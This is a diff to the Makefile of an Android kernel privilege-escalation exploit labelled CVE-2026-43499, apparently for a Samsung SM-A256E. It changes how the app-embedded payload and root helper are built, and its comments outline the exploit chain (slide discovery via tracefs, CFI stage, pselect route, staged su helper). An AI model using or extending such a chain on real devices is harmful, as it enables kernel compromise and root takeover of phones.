@@ -13,6 +13,7 @@ endif
 PRELOAD := $(OUTDIR)/cve-2026-43499
 APP_PRELOAD := $(OUTDIR)/cve-2026-43499-app.so
 APP_RELEASE := $(OUTDIR)/cve-2026-43499-app.release.so
+APP_FLAGS := -DAPP_PAYLOAD=1
 APP_RELEASE_SIZE := 104128
 ROOT_HELPER := $(OUTDIR)/cve-2026-43499-root
 
@@ -36,9 +37,12 @@ APP_PRELOAD_SRCS := \
 
 # SM-A256E app payload: the app-domain physical-P0 oracle needs a kernel-read
 # fd that only exists after the CFI stage, so the socket-interleave reclaim
-# cannot shape the P0-oracle page before slide discovery.  Use the device-tested
-# standalone tracefs slide route instead (run via Shizuku's shell bridge); the
-# app build then follows the identical proven pselect/CFI/root path.
+# cannot shape the P0-oracle page before slide discovery.  Build the app .so
+# from the exact device-tested standalone chain (slide.c tracefs route) and
+# without -DAPP_PAYLOAD: the standalone binary never panics the pselect PI
+# route on this firmware, while the app-flagged build does.  The app runs it
+# under Shizuku's shell bridge, and ROOT_UMH_PATH in target.h points at the
+# helper path the app stages (/data/local/tmp/ksu-helper).
 ifeq ($(TARGET),a25x-A256EXXSADZA2)
 APP_PRELOAD_SRCS := \
   src/main.c \
@@ -48,6 +52,7 @@ APP_PRELOAD_SRCS := \
   src/pipe.c \
   src/root.c \
   src/preload.c
+APP_FLAGS :=
 endif
 
 COMMON_CFLAGS := \
@@ -78,11 +83,11 @@ $(ROOT_HELPER): src/su_daemon.c | $(OUTDIR)
 	$(TARGET_CC) -fPIE -pie -O2 -g0 -Wall -Wextra $< -ldl -o $@
 
 $(APP_PRELOAD): $(APP_PRELOAD_SRCS) $(TARGET_HEADER) src/offset.h src/common.h src/kernelsnitch/*.h | $(OUTDIR)
-	$(TARGET_CC) -DAPP_PAYLOAD=1 -fPIC $(COMMON_CFLAGS) $(APP_PRELOAD_SRCS) \
+	$(TARGET_CC) $(APP_FLAGS) -fPIC $(COMMON_CFLAGS) $(APP_PRELOAD_SRCS) \
 	  -shared -pthread -o $@
 
 $(APP_RELEASE): $(APP_PRELOAD_SRCS) $(TARGET_HEADER) src/offset.h src/common.h src/kernelsnitch/*.h | $(OUTDIR)
-	$(TARGET_CC) -DAPP_PAYLOAD=1 -fPIC -Oz -g0 \
+	$(TARGET_CC) $(APP_FLAGS) -fPIC -Oz -g0 \
 	  -fno-unwind-tables -fno-asynchronous-unwind-tables \
 	  -ffunction-sections -fdata-sections \
 	  -Wall -Wextra -Wno-unused-parameter -Wno-sign-compare \
